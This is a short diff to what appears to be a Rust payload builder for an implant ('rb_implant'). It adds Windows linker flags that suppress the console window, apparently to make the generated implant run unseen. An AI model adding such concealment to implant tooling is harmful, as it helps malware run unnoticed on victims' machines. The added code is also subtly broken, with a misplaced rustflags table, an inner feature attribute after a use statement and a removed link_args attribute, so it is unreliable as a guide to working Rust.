@@ -28,6 +28,9 @@ edition = "2021"
 [dependencies]
 rb_implant = { path = "../rb_implant" }
 tokio = { version = "1", features = ["full"] }
+
+[target.x86_64-pc-windows-gnu]
+rustflags = ["-C", "link-args=-mwindows "]
 "#;
         fs::create_dir_all("rb_payload_build/src")?;
         fs::write("rb_payload_build/Cargo.toml", manifest)?;
@@ -35,6 +38,10 @@ tokio = { version = "1", features = ["full"] }
         // 2) Write main.rs that configures and invokes the shared implant entry-point
         let main_rs = format!(r#"
 use rb_implant::{{Args, run_implant_with_args}};
+
+#![feature(link_args)]
+#[link_args = "-Wl,--subsystem,windows"]
+extern "C" {{}}
 
 #[tokio::main]
 async fn main() {{
